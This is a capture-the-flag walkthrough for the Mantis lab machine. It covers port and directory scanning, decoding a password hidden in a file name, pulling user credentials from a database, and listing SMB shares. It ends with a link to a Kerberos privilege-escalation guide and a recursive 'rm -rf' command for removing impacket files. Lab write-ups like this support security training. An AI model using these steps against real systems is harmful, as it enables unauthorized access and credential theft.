1. Run nmap scan, from nmap scan we are able to determine that the machine is a windows 2008 Server, with   windows sql enabled. We also run a full tcp port scan to find anymore lingering ports that have not 
   been found: nmap -p- -oA all-ports 10.10.10.52

2. After running a full port scan, we find one of the missing ports not detailed in the initial nmap scan   that port being 1337. We run a gobuster to attempt to find any of available directories on the
   webserver being hosted by the mantis machine.

 gobuster dir -u http://10.10.10.52:1337/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
3. From gobuster we are able to find an interesting directory called, "secure_notes" within this
   directory, within the directory there is a unique file named:
	dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
   It also contain sthe following text:
	1. Download OrchardCMS
	2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
	3. Launch IIS and add new website and point to Orchard CMS folder location.
	4. Launch browser and navigate to http://localhost:8080
	5. Set admin password and configure sQL server connection string.
	6. Add blog pages with admin user.

  There also appears to be a secret message hidden within the name of the file, to decode the message 
  use the following:
	echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -ps -r
  The output appears to be a string that maybe the admin password for the database:
	m$$ql_S@_P@ssW0rd!

4. Next step is to access the database and navigate it to find pertinent info. To achieve this we can use
   a database client to allow for the ease of navigating. The cient is called "dbeaver".
   
   If you navigate to orcharddb, dbo , tables, blog_Orchard_Users_UserPartRecord you will be able to
   find in the data tab usernames and passwords for the admin and james user.
	admin	AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
	james	J@m3s_P@ssW0rd!

   The james user will allow you to get a foothold on the box.
 
   To list shares enter the following:
	smbclient -L 10.10.10.52  -U james
	Enter WORKGROUP\james's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

5. Next thing we use is the "knock pass kerberos exploitation" google and you will find a way to gain 
   admin privileges. The page is in the following link: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html

   Now just follow the instructions.

   Note: Make sure to use "chattr" to make the /etc/resolv.conf immutable: ex. chattr +i /etc/resolv.conf
   otherwise network manager will reset settings.

   Note while modifying, the /etc/krb5.conf make sure that all the names are captialized otherwise the 
   kinit command will not work.	

	kinit james
	klist

	If having issue delete all of impacket files: find / -type d -name '*impacket*' -exec rm -rf {} \;

	AND Install back again:
	pip3 install impacket
